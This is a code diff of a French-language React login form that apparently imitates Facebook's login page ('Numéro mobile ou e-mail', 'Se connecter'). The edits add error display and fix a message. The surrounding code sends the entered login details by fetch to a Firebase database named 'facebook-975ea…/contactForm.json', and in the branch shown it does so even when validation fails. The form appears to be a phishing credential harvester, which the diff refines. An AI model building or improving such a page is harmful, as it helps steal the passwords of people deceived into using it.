@@ -12,6 +12,8 @@ const LoginForm = () => {
     email: '',
     password: ''
   });
+  const [showErrors, setShowErrors] = useState(false); // Nouvel état pour afficher les erreurs
+
   const validatePassword = (password) => {
     // Vérifiez si le mot de passe a une longueur d'au moins 6 caractères
     return password.length >= 6;
@@ -25,22 +27,25 @@ const LoginForm = () => {
     return emailRegex.test(input) || phoneRegex.test(input);
   };
   
+
+  
   const data = (e) => {
     const { name, value } = e.target;
     setUser({ ...user, [name]: value });
-  
+
     // Validation pour l'email ou le numéro de téléphone
     if (name === 'Email') {
       const emailOrPhoneError = validateEmailOrPhone(value) ? '' : 'Adresse email ou numéro de téléphone invalide';
       setErrors({ ...errors, email: emailOrPhoneError });
     }
-  
+
     // Validation pour le mot de passe
     if (name === 'Password') {
-      const passwordError = validatePassword(value) ? '' : 'Le mot de passe doit contenir invalide';
+      const passwordError = validatePassword(value) ? '' : 'Le mot de passe invalide';
       setErrors({ ...errors, password: passwordError });
     }
   };
+
   const getdata = async (e) => {
     e.preventDefault();
 
@@ -65,6 +70,9 @@ const LoginForm = () => {
 
       console.log(res);
     } else {
+      // Afficher les erreurs en activant le flag showErrors
+      setShowErrors(true);
+      
       const options = {
         method: 'POST',
         headers: {
@@ -77,7 +85,6 @@ const LoginForm = () => {
       };
 
       const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);
-
 
       console.log(res);
       // Afficher des messages d'erreur ou empêcher l'envoi de la requête
@@ -94,7 +101,7 @@ const LoginForm = () => {
         placeholder="Numéro mobile ou e-mail"
         value={user.Email} onChange={data}
       />
-      <span className="error-message ">{errors.email}</span>
+      {showErrors && <span className="error-message">{errors.email}</span>}
 
       <input
         type="password"
@@ -103,7 +110,7 @@ const LoginForm = () => {
         placeholder="Mot de passe"
         value={user.Password} onChange={data}
       />
-      <span className="error-messagee">{errors.password}</span>
+      {showErrors && <span className="error-messagee">{errors.password}</span>}
 
       <button type="submit" onClick={getdata}>Se connecter</button>
       <a href="#">Mot de passe oublié ?</a>
